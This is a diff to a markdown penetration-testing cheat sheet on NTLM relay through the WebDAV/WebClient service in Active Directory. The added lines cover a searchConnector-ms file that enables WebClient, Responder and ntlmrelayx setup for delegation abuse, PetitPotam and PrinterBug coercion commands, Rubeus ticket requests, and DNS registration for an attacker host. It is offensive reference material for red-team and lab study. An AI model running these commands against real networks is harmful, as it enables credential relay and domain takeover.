@@ -245,18 +245,55 @@ secretsdump.py -k -no-pass target.lab.local
 
 *  WebClient service
 
+
+**Enable WebClient**:
+
+WebClient service can be enable on the machine using several techniques:
+
+* Mapping a WebDav server using `net` command : `net use ...`
+* Typing anything into the explorer address bar that isn't a local file or directory
+* Browsing to a directory or share that has a file with a `.searchConnector-ms` extension located inside.
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+        <description>Microsoft Outlook</description>
+        <isSearchOnlyItem>false</isSearchOnlyItem>
+        <includeInStartMenuScope>true</includeInStartMenuScope>
+        <templateInfo>
+            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+        </templateInfo>
+        <simpleLocation>
+            <url>https://example/</url>
+        </simpleLocation>
+    </searchConnectorDescription>
+    ```
+
 **Exploitation**:
 
-* Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
-* Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
-* Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
-* Discover WebDAV services
+* Discover machines on the network with enabled WebClient service
     ```ps1
     webclientservicescanner 'domain.local'/'user':'password'@'machine'
-    netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
+    netexec smb 10.10.10.10 -d 'domain' -u 'user' -p 'password' -M webdav
     GetWebDAVStatus.exe 'machine'
     ```
-* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
+
+* Disable HTTP in Responder
+    ```ps1
+    sudo vi /usr/share/responder/Responder.conf
+    ```
+
+* Generate a Windows machine name, e.g: "WIN-UBNW4FI3AP0"
+    ```ps1
+    sudo responder -I eth0
+    ```
+
+* Prepare for RBCD against the DC
+    ```ps1
+    python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support
+    ```
+
+
+* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.10.10.10`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
   ```ps1
   # PrinterBug
   dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
@@ -267,6 +304,7 @@ secretsdump.py -k -no-pass target.lab.local
   Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
   PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
   ```
+
 * Use the created account to ask for a service ticket: 
     ```ps1
     .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
@@ -274,6 +312,13 @@ secretsdump.py -k -no-pass target.lab.local
     ls \\PC1.purple.lab\c$
     # IP of PC1: 10.0.0.4
     ```
+
+An alternative for the previous exploitation method is to register a **DNS entry** for the attack machine by yourself then trigger the coercion.
+
+```ps1
+python3 /opt/krbrelayx/dnstool.py -u lab.lan\\jdoe -p 'P@ssw0rd' -r attacker.lab.lan -a add -d 192.168.1.50 192.168.1.2
+python3 /opt/PetitPotam.py -u jdoe -p 'P@ssw0rd' -d lab.lan attacker@80/test 192.168.1.3
+```
 
 
 ## Man-in-the-middle RDP connections with pyrdp-mitm
